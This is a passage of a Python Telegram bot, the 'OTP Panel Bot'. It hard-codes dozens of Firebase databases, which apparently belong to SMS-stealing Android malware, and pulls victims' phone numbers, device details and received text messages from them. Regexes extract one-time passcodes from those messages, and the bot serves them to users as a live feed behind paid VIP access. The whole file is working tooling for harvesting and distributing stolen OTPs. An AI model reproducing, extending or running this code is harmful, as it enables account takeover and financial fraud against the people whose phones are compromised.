#!/usr/bin/env python3
"""
OTP PANEL BOT — SUPREME MASTER EDITION v3.7 RENDER WEBHOOK
Webhook mode for Render.com · Health check endpoint · Graceful shutdown
Private OTP (unlimited, no-delete) · /recent · firebase.txt logging
"""

import os
import re
import time
import json
import asyncio
import logging
from collections import deque
from datetime import datetime
from typing import Optional
import aiohttp
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton, BotCommand,
)
from telegram.error import BadRequest, Forbidden, RetryAfter, TimedOut, TelegramError
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)

logging.basicConfig(
    format="%(asctime)s — %(name)s — %(levelname)s — %(message)s",
    level=logging.WARNING,
)

# ════════════════════════════════════════════════════════════
#  CONFIG
# ════════════════════════════════════════════════════════════

DATABASES = {
    "Heaven": "https://hood-4ba1e-default-rtdb.firebaseio.com",
    "Lucifer": "https://lucifer-spreader-default-rtdb.firebaseio.com",
    "Totla": "https://totla-axis-default-rtdb.firebaseio.com",
    "RGG": "https://rgggggggggg-e2547-default-rtdb.firebaseio.com",
    "Bulbul": "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
    "Systumm": "https://systumm-c8526-default-rtdb.firebaseio.com",
    "Ravan": "https://ravan-98ef1-default-rtdb.firebaseio.com",
    "Yellow": "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com",
    "PMKishan": "https://pmkishan8-6b70f-default-rtdb.firebaseio.com",
    "NoAdmin": "https://no-admin-e0a30-default-rtdb.firebaseio.com",
    "SexyPayload": "https://sexypayload-default-rtdb.firebaseio.com",
    "Love": "https://love-13ffc-default-rtdb.firebaseio.com",
    "Deepak": "https://deepak-c22e3-default-rtdb.firebaseio.com",
    "Takul": "https://takul-cf410-default-rtdb.firebaseio.com",
    "RTO": "https://rto-02-april06-default-rtdb.firebaseio.com",
    "PKSK": "https://projectpksk05102025-default-rtdb.firebaseio.com",
    "Rajkumar": "https://rajkumar-b6cbe-default-rtdb.firebaseio.com",
    "Rtoo": "https://rtoo-6c8e6-default-rtdb.firebaseio.com",
    "Upandar": "https://upandar-bb51e-default-rtdb.firebaseio.com",
    "Rolex": "https://rolex-carder-default-rtdb.firebaseio.com",
    "Rettiugh": "https://rettiugh-default-rtdb.firebaseio.com",
    "BusinessApps": "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
    "Jeet": "https://jeet-op-default-rtdb.firebaseio.com",
    "Vvvvv": "https://vvvvv-b5eae-default-rtdb.firebaseio.com",
    "Jaanu": "https://jaanubaby-f7b34-default-rtdb.firebaseio.com",
    "JJGambler": "https://jj-gambler-default-rtdb.firebaseio.com",
    "Suman": "https://suman-penal-default-rtdb.firebaseio.com",
    "Tuuui": "https://tuuui-60b15-default-rtdb.firebaseio.com",
    "AdminSonu": "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
    "Rohet": "https://rohet10-8919f-default-rtdb.firebaseio.com",
    "Zeni": "https://zeni-ae60b-default-rtdb.firebaseio.com",
    "Maxxx": "https://maxxx-randi-default-rtdb.firebaseio.com",
    "Gulabi": "https://gulabi-fuddi-default-rtdb.firebaseio.com",
    "Comkingdir": "https://comkingdir-default-rtdb.firebaseio.com",
    "Tracegod": "https://tracegod-168d5-default-rtdb.firebaseio.com",
    "UCOp": "https://uc-op-ca3d2-default-rtdb.firebaseio.com",
    "SMSForward": "https://smsforward-b2198.firebaseio.com",
    "Hdrbf": "https://hdrbf-485ec-default-rtdb.firebaseio.com",
    "Bunty": "https://bunty-51bcc-default-rtdb.firebaseio.com",
    "VishalAravat": "https://vishal-x-aravat-default-rtdb.firebaseio.com",
    "AdminCliwny": "https://admin-cliwny-default-rtdb.firebaseio.com",
    "Danish": "https://danish-77fe3-default-rtdb.firebaseio.com",
    "MasterAdmin": "https://master-admin-6c650-default-rtdb.firebaseio.com",
    "PanelOp": "https://panel-op-feb4d-default-rtdb.firebaseio.com",
    "PM23": "https://pm23-98f32-default-rtdb.firebaseio.com",
    "Iiiii": "https://iiiii-ade0e-default-rtdb.firebaseio.com",
    "Pint": "https://pint-f465b-default-rtdb.firebaseio.com",
    "AdminPanel": "https://admin-panel-bfcdc-default-rtdb.firebaseio.com",
    "CallMeBitch": "https://callmebitchfumckyou-default-rtdb.firebaseio.com",
    "Demonrat": "https://demonrat-aa782-default-rtdb.firebaseio.com",
    "Access20": "https://access20-3fc38-default-rtdb.firebaseio.com",
    "Article": "https://article-efd36-default-rtdb.firebaseio.com",
    "Rajababu": "https://rajababukvirat-default-rtdb.firebaseio.com",
    "AxisSuraj": "https://axis-suraj-tele-apcd001-default-rtdb.firebaseio.com",
    "Sandycall": "https://sandycall-18b15-default-rtdb.firebaseio.com",
    "Suihd": "https://suihd-default-rtdb.firebaseio.com",
    "Harrwp": "https://harrwp-6be36-default-rtdb.firebaseio.com",
    "TestFirebase": "https://test-firebase.firebaseio.com",
    "Adutapp": "https://adutappbylucy-default-rtdb.firebaseio.com",
    "Download": "https://download-b7393-default-rtdb.firebaseio.com",
    "Bobnewloda": "https://bobnewloda-default-rtdb.firebaseio.com",
    "Artikumari": "https://artikumari-abc97-default-rtdb.firebaseio.com",
    "Seuihd": "https://seuihd-default-rtdb.firebaseio.com",
    "Gigapaid": "https://gigapaid-39e9c-default-rtdb.firebaseio.com",
    "Angeladmin": "https://angeladmin-9dedc-default-rtdb.firebaseio.com",
    "FirNew": "https://fir-new-fe8b8-default-rtdb.firebaseio.com",
    "Priysnshuu": "https://priysnshuu-default-rtdb.firebaseio.com",
    "Haab": "https://haab-b3370-default-rtdb.firebaseio.com",
    "Ueuwuw": "https://ueuwuw-default-rtdb.firebaseio.com",
    "Test": "https://test.firebaseio.com",
    "Jkhsadfhjk": "https://jkhsadfhjk-default-rtdb.firebaseio.com",
    "Sonic": "https://sonic-d5c1a-default-rtdb.firebaseio.com",
    "Jonisins": "https://jonisins-52271-default-rtdb.firebaseio.com",
    "Dusman": "https://dusman-abf8b-default-rtdb.firebaseio.com",
    "Riyy": "https://riyy-e012e-default-rtdb.firebaseio.com",
    "Xkpz": "https://xkpz-f937a-default-rtdb.firebaseio.com",
    "Thanu": "https://thanu-4174d-default-rtdb.firebaseio.com",
    "Vdgsh": "https://vdgsh-623ed-default-rtdb.firebaseio.com",
    "Vibe": "https://vibe-d238e-default-rtdb.firebaseio.com",
    "Jamini": "https://jamini-c946b-default-rtdb.firebaseio.com",
    "Chutkabaal": "https://chutkabaal-d7051-default-rtdb.firebaseio.com",
    "Surya": "https://surya-917b9-default-rtdb.firebaseio.com",
    "Doodh": "https://doodh-f4f98-default-rtdb.firebaseio.com",
    "Easrerrr": "https://easrerrr-default-rtdb.firebaseio.com",
    "Maxbhai": "https://maxbhai-b8d3a-default-rtdb.firebaseio.com",
    "Upandar2": "https://upandar-bb51e-default-rtdb.firebaseio.com",
    "Uuuuu": "https://uuuuu-ee02e-default-rtdb.firebaseio.com",
    "Vamprandi": "https://vamprandi-default-rtdb.firebaseio.com",
    "VishalMC": "https://vishal-mc-default-rtdb.firebaseio.com",
    "ProjectF2FD6": "https://project-f2fd6-default-rtdb.firebaseio.com",
    "Rajakk": "https://rajakk-80ecd-default-rtdb.firebaseio.com",
    "ILove": "https://i-love-9e34a-default-rtdb.firebaseio.com",
    "Customer1B7CA": "https://customer-1b7ca-default-rtdb.firebaseio.com",
    "Nunu2XX": "https://nunu2xx-a8c5b-default-rtdb.firebaseio.com",
}

POLL_INTERVAL = 5
SMS_LIMIT = 15
TOKEN = os.environ.get("BOT_TOKEN", "")
BOT_USERNAME = os.environ.get("BOT_USERNAME", "onlinenonlyscript_bot")
DB_FILE = os.environ.get("DB_FILE", "bot_database.json")

ADMIN_IDS_RAW = os.environ.get("ADMIN_IDS", "7178096331")
ADMIN_IDS: set[int] = {int(x.strip()) for x in ADMIN_IDS_RAW.split(",") if x.strip().isdigit()}

REQUIRED_CHANNELS = [
    {"username": "earnflowspidy", "url": "https://t.me/earnflowspidy", "name": "Raji Expilot"},
]

FIREBASE_LOG_FILE = "firebase.txt"
MAX_PRIVATE_DBS_PER_USER = 999999
MAX_PRIVATE_DBS_TOTAL = 999999
PRIVATE_REFRESH_BATCH = 12
VIP_PRICE_COINS = 20
VIP_DURATION_HOURS = 10

# Render-specific
PORT = int(os.environ.get("PORT", "8080"))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "").rstrip("/")

# ════════════════════════════════════════════════════════════
#  GLOBAL STATE
# ════════════════════════════════════════════════════════════

seen_ids: set[str] = set()
_seen_order: deque = deque()
SEEN_MAX: int = 200000
first_run: bool = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None

all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_focus: dict[str, dict[int, str]] = {TOKEN: {}}
chats_registry: dict[str, set[int]] = {TOKEN: set()}

CLONES: dict[str, dict] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}
GLOBAL_DEVICE_CACHE_TS: dict[str, float] = {}

PRIVATE_DBS: dict[int, list[dict]] = {}
PRIVATE_DEVICE_CACHE: dict[str, list] = {}
PRIVATE_DEVICE_CACHE_TS: dict[str, float] = {}
_private_refresh_idx = 0

FIREBASE_SEM_LIMIT = 60
SEND_SEM_LIMIT = 30
_firebase_sem = asyncio.Semaphore(FIREBASE_SEM_LIMIT)
_send_sem = asyncio.Semaphore(SEND_SEM_LIMIT)
_save_lock = asyncio.Lock()

# ════════════════════════════════════════════════════════════
#  ANTI-SPAM MANAGER
# ════════════════════════════════════════════════════════════

class AntiSpamManager:
    def __init__(self, cooldown: float = 1.5, max_tracked: int = 10000):
        self._locks: dict[int, asyncio.Lock] = {}
        self._last: dict[int, float] = {}
        self.cooldown = cooldown
        self.max_tracked = max_tracked

    def lock_for(self, user_id: int) -> asyncio.Lock:
        lock = self._locks.get(user_id)
        if lock is None:
            lock = asyncio.Lock()
            self._locks[user_id] = lock
            if len(self._locks) > self.max_tracked:
                self._prune()
        return lock

    def is_busy(self, user_id: int) -> bool:
        lock = self._locks.get(user_id)
        return bool(lock and lock.locked())

    def is_rate_limited(self, user_id: int) -> bool:
        if user_id in ADMIN_IDS:
            return False
        now = time.time()
        if now - self._last.get(user_id, 0.0) < self.cooldown:
            return True
        self._last[user_id] = now
        if len(self._last) > self.max_tracked:
            cutoff = now - 3600
            self._last = {u: t for u, t in self._last.items() if t > cutoff}
        return False

    async def acquire(self, user_id: int) -> None:
        await self.lock_for(user_id).acquire()

    def release(self, user_id: int) -> None:
        lock = self._locks.get(user_id)
        if lock and lock.locked():
            lock.release()

    def _prune(self) -> None:
        for uid, lock in list(self._locks.items()):
            if not lock.locked() and uid not in self._last:
                self._locks.pop(uid, None)
            if len(self._locks) <= self.max_tracked // 2:
                break


user_guards = AntiSpamManager(cooldown=1.5)


def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return False
    return user_guards.is_rate_limited(user_id)


def is_vip(bot_token: str, user_id: int) -> bool:
    if bot_token == TOKEN and user_id in ADMIN_IDS:
        return True
    if bot_token != TOKEN and user_id == CLONES.get(bot_token, {}).get("creator"):
        return True
    users_db = all_users if bot_token == TOKEN else CLONES.get(bot_token, {}).get("users", {})
    return time.time() < users_db.get(user_id, {}).get("vip_until", 0.0)


def get_vip_time_left(bot_token: str, user_id: int) -> str:
    users_db = all_users if bot_token == TOKEN else CLONES.get(bot_token, {}).get("users", {})
    left = users_db.get(user_id, {}).get("vip_until", 0.0) - time.time()
    if left <= 0:
        return "Not VIP"
    h, m = int(left // 3600), int((left % 3600) // 60)
    return f"{h}h {m}m"


def tlog(msg: str) -> None:
    print(f"[{datetime.now().strftime('%I:%M:%S %p')}]  {msg}", flush=True)


async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    err = context.error
    if isinstance(err, (Forbidden, BadRequest)):
        return
    tlog(f"Telegram API Error: {err}")

# ════════════════════════════════════════════════════════════
#  HTTP SESSION
# ════════════════════════════════════════════════════════════

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(
            limit=1000, limit_per_host=100, keepalive_timeout=60,
            ttl_dns_cache=300, enable_cleanup_closed=True,
        )
        timeout = aiohttp.ClientTimeout(total=8, connect=5, sock_connect=5, sock_read=8)
        _http_session = aiohttp.ClientSession(
            connector=connector, timeout=timeout,
            headers={"User-Agent": "OTPPanelBot/3.7"},
        )
    return _http_session


async def close_http_session() -> None:
    global _http_session
    if _http_session is not None and not _http_session.closed:
        try:
            await _http_session.close()
        except Exception:
            pass
    _http_session = None


async def fb_get(path: str, base: str) -> Optional[dict]:
    for attempt in range(2):
        try:
            async with _firebase_sem:
                session = await get_http_session()
                url = f"{base}/{path}.json" if path else f"{base}/.json"
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if r.status != 200:
                        return None
                    data = await r.json(content_type=None)
                    return data if isinstance(data, dict) else None
        except (aiohttp.ClientError, asyncio.TimeoutError):
            if attempt == 1:
                return None
            await asyncio.sleep(0.2)
        except Exception:
            return None
    return None


async def fb_keys(path: str, base: str) -> list[str]:
    for attempt in range(2):
        try:
            async with _firebase_sem:
                session = await get_http_session()
                url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if r.status != 200:
                        return []
                    data = await r.json(content_type=None)
                    return list(data.keys()) if isinstance(data, dict) else []
        except (aiohttp.ClientError, asyncio.TimeoutError):
            if attempt == 1:
                return []
            await asyncio.sleep(0.2)
        except Exception:
            return []
    return []


def mark_seen(key: str) -> None:
    if key in seen_ids:
        return
    if len(seen_ids) >= SEEN_MAX:
        try:
            old = _seen_order.popleft()
            seen_ids.discard(old)
        except IndexError:
            seen_ids.clear()
    seen_ids.add(key)
    _seen_order.append(key)

# ════════════════════════════════════════════════════════════
#  CHANNEL CHECK
# ════════════════════════════════════════════════════════════

async def check_membership(bot_token, bot, user_id: int) -> list[str]:
    if bot_token != TOKEN:
        return []
    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=f"@{ch['username']}", user_id=user_id)
            status = str(member.status).lower()
            if status in ("left", "kicked", "banned"):
                not_joined.append(ch["username"])
        except Exception as e:
            tlog(f"⚠️ Membership check failed for @{ch['username']}: {e}")
            continue
    return not_joined


async def send_join_prompt(update: Update, is_main_bot: bool) -> None:
    buttons = [[InlineKeyboardButton(f"📢 Join {ch['name']}", url=ch["url"])] for ch in REQUIRED_CHANNELS]
    buttons.append([InlineKeyboardButton("✅ I Have Joined — Check Now", callback_data="check_join")])
    text = "🔒 *Verification Required*\n\nBot use karne ke liye neeche diye gaye channels join karna hoga:\n\n"
    for ch in REQUIRED_CHANNELS:
        text += f"• {ch['name']}: {ch['url']}\n"
    text += "\nChannel join karne ke baad 'Check Now' button dabayein."
    try:
        await update.effective_message.reply_text(
            text, reply_markup=InlineKeyboardMarkup(buttons),
            disable_web_page_preview=True, parse_mode="Markdown")
    except TelegramError as e:
        tlog(f"Join prompt send failed: {e}")

# ════════════════════════════════════════════════════════════
#  UTILITIES
# ════════════════════════════════════════════════════════════

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", n)
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c


def bat_emoji(pct: int) -> str:
    return "🔋" if pct >= 20 else "🪫"


OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"code[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"password[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{4})\b"),
]


def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m: return m.group(1)
    return None


def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        d = re.sub(r"\D", "", val)
        return int(d) if d else 0
    return 0


def parse_status_str(val) -> str:
    if not val: return "offline"
    return "online" if str(val).lower() == "online" else "offline"


def parse_status_bool(val) -> str:
    return "online" if val is True else "offline"


def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return str(date_str)
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except Exception:
            pass
    return "N/A"


def time_ago(ts) -> str:
    try:
        t = float(ts)
        if t <= 0: return "unknown"
        if t > 1e11: t /= 1000
        diff = time.time() - t
        if diff < 60: return "just now"
        if diff < 3600: return f"{int(diff // 60)} min ago"
        if diff < 86400: return f"{int(diff // 3600)}h {int((diff % 3600) // 60)}m ago"
        return f"{int(diff // 86400)}d ago"
    except Exception:
        return "unknown"


def seen_key(device_id: str, k: str) -> str:
    return f"{device_id}/{k}"


def user_display(info: dict) -> str:
    name = info.get("name", "Unknown")
    uname = info.get("username", "")
    return f"{name} (@{uname})" if uname else name


URL_RE = re.compile(r"https?://[^\s,\)\]\}\"'<>\n]+")
FIREBASE_URL_RE = re.compile(r"https?://[A-Za-z0-9\-\.]+\.firebaseio\.com/?", re.IGNORECASE)


def extract_urls(text: str) -> list[str]:
    return [u.strip().rstrip("/.,;") for u in URL_RE.findall(text or "")]


def extract_firebase_urls(text: str) -> list[str]:
    if not text:
        return []
    found = FIREBASE_URL_RE.findall(text)
    out, seen = [], set()
    for u in found:
        u = u.strip().rstrip("/")
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


def auto_db_name(url: str, reserved: Optional[set] = None) -> str:
    m = re.search(r"https?://([^./\s]+)", url)
    host = m.group(1) if m else "db"
    parts = [p for p in host.split("-") if p and p.lower() not in ("default", "rtdb", "firebaseio", "firebase")]
    while parts and re.fullmatch(r"[0-9a-fA-F]{3,}|\d+", parts[-1]):
        parts.pop()
    base = "".join(p.capitalize() for p in parts) if parts else "Db"
    if not base: base = "Db"
    name = base
    i = 2
    taken = set(DATABASES.keys())
    if reserved: taken |= reserved
    while name in taken:
        name = f"{base}{i}"
        i += 1
    return name

# ════════════════════════════════════════════════════════════
#  firebase.txt LOGGING + PRIVATE DB HELPERS
# ════════════════════════════════════════════════════════════

def log_firebase_url(url: str, user_id: int, source: str = "public") -> None:
    try:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(FIREBASE_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] user={user_id} source={source} url={url}\n")
    except Exception as e:
        tlog(f"firebase.txt log failed: {e}")


def total_private_dbs() -> int:
    return sum(len(v) for v in PRIVATE_DBS.values())


async def add_private_db(user_id: int, url: str) -> tuple[bool, str, int]:
    url = url.strip().rstrip("/")
    if not url.startswith("http") or ".firebaseio.com" not in url:
        return False, "Invalid Firebase URL", 0
    for pdb in PRIVATE_DBS.get(user_id, []):
        if pdb["url"] == url:
            return False, "Already added", 0
    name = auto_db_name(url)
    existing = {p["name"] for p in PRIVATE_DBS.get(user_id, [])}
    base, i = name, 2
    while name in existing:
        name = f"{base}{i}"; i += 1
    try:
        devs = await fetch_db_data(name, url)
    except Exception:
        devs = []
    PRIVATE_DBS.setdefault(user_id, []).append({
        "name": name, "url": url,
        "added_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
    })
    PRIVATE_DEVICE_CACHE[url] = devs
    PRIVATE_DEVICE_CACHE_TS[url] = time.time()
    log_firebase_url(url, user_id, source="private")
    return True, name, len(devs)


async def bulk_add_databases(urls: list[str], user_id: int = 0,
                             source: str = "public") -> tuple[list[tuple[str, int]], list[str]]:
    added: list[tuple[str, int]] = []
    failed: list[str] = []
    existing_urls = set(DATABASES.values())
    planned: list[tuple[str, str]] = []
    reserved: set = set()
    for u in urls:
        u = u.strip()
        if not u.startswith("http"):
            continue
        if u in existing_urls or any(u == p[1] for p in planned):
            continue
        name = auto_db_name(u, reserved)
        reserved.add(name)
        planned.append((name, u))
    if not planned:
        return added, failed

    async def fetch_one(name: str, url: str):
        try:
            devs = await fetch_db_data(name, url)
            return name, url, devs
        except Exception:
            return name, url, []

    results = await asyncio.gather(*(fetch_one(n, u) for n, u in planned), return_exceptions=True)
    for res in results:
        if isinstance(res, Exception):
            continue
        name, url, devs = res
        DATABASES[name] = url
        GLOBAL_DEVICE_CACHE[name] = devs
        GLOBAL_DEVICE_CACHE_TS[name] = time.time()
        log_firebase_url(url, user_id, source=source)
        added.append((name, len(devs)))
    return added, failed

# ════════════════════════════════════════════════════════════
#  DEVICE CLASS
# ════════════════════════════════════════════════════════════

PAGE_SIZE = 20


class Device:
    __slots__ = ("id", "name", "status", "battery", "timestamp",
                 "numbers", "device_info", "sms_path", "base_url", "db_tag")

    def __init__(self, id, name, status, battery, timestamp, numbers,
                 device_info, sms_path, base_url, db_tag):
        self.id = id
        self.name = name
        self.status = status
        self.battery = battery
        self.timestamp = timestamp
        self.numbers = numbers
        self.device_info = device_info
        self.sms_path = sms_path
        self.base_url = base_url
        self.db_tag = db_tag


async def fetch_db_data(tag: str, url: str) -> list[Device]:
    devices_list: list[Device] = []
    added_set: set = set()
    try:
        root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
            fb_keys("", url),
            fb_get("All_Users/simDetails", url),
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url),
            fb_get("clients", url),
            return_exceptions=True,
        )
        root_keys = [] if isinstance(root_keys, Exception) else (root_keys or [])
        sim_all = None if isinstance(sim_all, Exception) else sim_all
        device_info_all = None if isinstance(device_info_all, Exception) else device_info_all
        user_data_all = None if isinstance(user_data_all, Exception) else user_data_all
        clients_all = None if isinstance(clients_all, Exception) else clients_all

        if sim_all and isinstance(sim_all, dict):
            info_all = device_info_all or {}
            for dev_id, sim in sim_all.items():
                if dev_id in added_set: continue
                added_set.add(dev_id)
                info = info_all.get(dev_id) or {}
                nums = []
                for field in ("sim1Number", "sim2Number"):
                    n = (sim or {}).get(field, "") or ""
                    if n and len(re.sub(r"\D", "", n)) > 4:
                        nums.append(fmt_num(n))
                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_str(info.get("Status")),
                    battery=parse_battery(info.get("Battery")),
                    timestamp=int(info.get("currentTimeMillis") or 0),
                    numbers=nums,
                    device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))

        if user_data_all and isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if dev_id in added_set: continue
                if not isinstance(data, dict): continue
                added_set.add(dev_id)
                nums = []
                for field in ("numberSim1", "numberSim2", "mobNo"):
                    n = data.get(field, "")
                    if n and len(re.sub(r"\D", "", str(n))) > 4:
                        nums.append(fmt_num(str(n)))
                devices_list.append(Device(
                    id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}",
                    status=parse_status_str(data.get("status")),
                    battery=parse_battery(data.get("battery")),
                    timestamp=int(data.get("timestamp") or 0), numbers=nums,
                    device_info=data.get("Device_info") or f"Device ID: {dev_id}",
                    sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))

        if clients_all and isinstance(clients_all, dict):
            for dev_id, client in clients_all.items():
                if dev_id in added_set: continue
                if not isinstance(client, dict): continue
                nums = []
                mob = client.get("mobNo") or ""
                if mob and len(re.sub(r"\D", "", str(mob))) > 5:
                    nums.append(fmt_num(str(mob)))
                elif client.get("sims") and isinstance(client["sims"], list):
                    if len(client["sims"]) > 0:
                        ph = (client["sims"][0] or {}).get("phoneNumber") or ""
                        if ph and len(re.sub(r"\D", "", str(ph))) > 5:
                            nums.append(fmt_num(str(ph)))
                if not nums and not client.get("modelName"): continue
                added_set.add(dev_id)
                model = client.get("modelName") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_bool(client.get("status")),
                    battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums,
                    device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))

        if root_keys:
            type4_keys = [k for k in root_keys if len(k) == 16 and re.match(r"^[0-9a-fA-F]+$", k)]
            if type4_keys:
                async def fetch_t4(k):
                    info, sim, hb = await asyncio.gather(
                        fb_get(f"{k}/deviceInfo", url), fb_get(f"{k}/simInfo", url),
                        fb_get(f"{k}/heartbeat", url), return_exceptions=True)
                    info = None if isinstance(info, Exception) else info
                    sim = None if isinstance(sim, Exception) else sim
                    hb = None if isinstance(hb, Exception) else hb
                    return k, info, sim, hb
                results = await asyncio.gather(*(fetch_t4(k) for k in type4_keys), return_exceptions=True)
                for res in results:
                    if isinstance(res, Exception): continue
                    k, info, sim, hb = res
                    if not isinstance(info, dict): continue
                    if k in added_set: continue
                    added_set.add(k)
                    nums = []
                    if isinstance(sim, dict):
                        for _, sim_v in sim.items():
                            if isinstance(sim_v, dict):
                                n = sim_v.get("number", "")
                                if n and len(re.sub(r"\D", "", str(n))) > 4:
                                    nums.append(fmt_num(str(n)))
                    model = info.get("model") or info.get("brand") or f"Device-{k[:6]}"
                    ts = int(hb) if isinstance(hb, (int, float)) else 0
                    is_online = (time.time() * 1000 - ts) < 300000 if ts else False
                    status = "online" if is_online else "offline"
                    devices_list.append(Device(
                        id=k, name=model, status=status, battery=0, timestamp=ts, numbers=nums,
                        device_info=f"Model: {model}\nBrand: {info.get('brand','')}\nAndroid: {info.get('version','')}\nDevice ID: {k}",
                        sms_path=f"{k}/receivedSms", base_url=url, db_tag=tag))
    except Exception as e:
        tlog(f"fetch_db_data[{tag}] recovered: {e}")
    return devices_list


async def get_all_devices(bot_token: str, user_id: Optional[int] = None) -> list[Device]:
    dbs_to_check = list(DATABASES.keys())
    if bot_token != TOKEN and bot_token in CLONES:
        custom_db = CLONES[bot_token].get("custom_db")
        if custom_db:
            dbs_to_check.append(f"C_{bot_token[:6]}")
    devices = []
    for tag in dbs_to_check:
        devices.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
    if user_id is not None:
        for pdb in PRIVATE_DBS.get(user_id, []):
            devices.extend(PRIVATE_DEVICE_CACHE.get(pdb["url"], []))
    unique = {}
    for d in devices:
        unique.setdefault(d.id, d)
    dev_list = list(unique.values())
    dev_list.sort(key=lambda d: (0 if d.status == "online" else 1,
                                 0 if len(d.numbers) > 0 else 1, -d.timestamp))
    return dev_list


async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await fb_get(device.sms_path, device.base_url)
    if not data: return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]
# ════════════════════════════════════════════════════════════
#  COMMAND MENU
# ════════════════════════════════════════════════════════════

async def register_commands(app: Application):
    commands = [
        BotCommand("start",       "🚀 Start the bot"),
        BotCommand("recent",      "🔑 Recent OTPs live feed"),
        BotCommand("points",      "💰 Check your coins"),
        BotCommand("referral",    "💸 Get referral link"),
        BotCommand("leaderboard", "🏆 Top users"),
        BotCommand("support",     "💬 Support & community"),
        BotCommand("cancel",      "❌ Cancel ongoing operation"),
        BotCommand("admin",       "🛡 Admin panel (admin only)"),
        BotCommand("status",      "📊 Live status (admin only)"),
        BotCommand("help",        "🛡 Admin commands (admin only)"),
        BotCommand("stats",       "📊 Bot statistics (admin only)"),
    ]
    try:
        await app.bot.set_my_commands(commands)
        tlog(f"✅ Commands registered: {len(commands)}")
    except Exception as e:
        tlog(f"⚠️ Failed to set commands: {e}")

# ════════════════════════════════════════════════════════════
#  CLONE ENGINE
# ════════════════════════════════════════════════════════════

def build_handlers(application: Application) -> None:
    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(CommandHandler("recent", cmd_recent))
    application.add_handler(CommandHandler("points", cmd_points))
    application.add_handler(CommandHandler("referral", cmd_referral))
    application.add_handler(CommandHandler("cancel", cmd_cancel))
    application.add_handler(CommandHandler("help", cmd_help))
    application.add_handler(CommandHandler("stats", cmd_stats))
    application.add_handler(CommandHandler("admin", cmd_admin))
    application.add_handler(CommandHandler("status", cmd_bot_status))
    application.add_handler(CommandHandler("leaderboard", cmd_leaderboard))
    application.add_handler(CommandHandler("support", cmd_support))
    application.add_handler(CallbackQueryHandler(on_callback))
    application.add_handler(MessageHandler(filters.COMMAND, on_command))
    application.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, on_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    application.add_error_handler(global_error_handler)


async def start_clone_bot(clone_token: str):
    app = (
        Application.builder()
        .token(clone_token)
        .connection_pool_size(1000)
        .pool_timeout(60.0)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .build()
    )
    build_handlers(app)
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    await register_commands(app)
    return app


async def stop_clone_app(clone_app) -> None:
    try:
        if clone_app is None:
            return
        if getattr(clone_app, "updater", None):
            await clone_app.updater.stop()
        await clone_app.stop()
        await clone_app.shutdown()
    except Exception as e:
        tlog(f"Clone shutdown warning: {e}")

# ════════════════════════════════════════════════════════════
#  UI BUILDERS  (v3.7 clean layout)
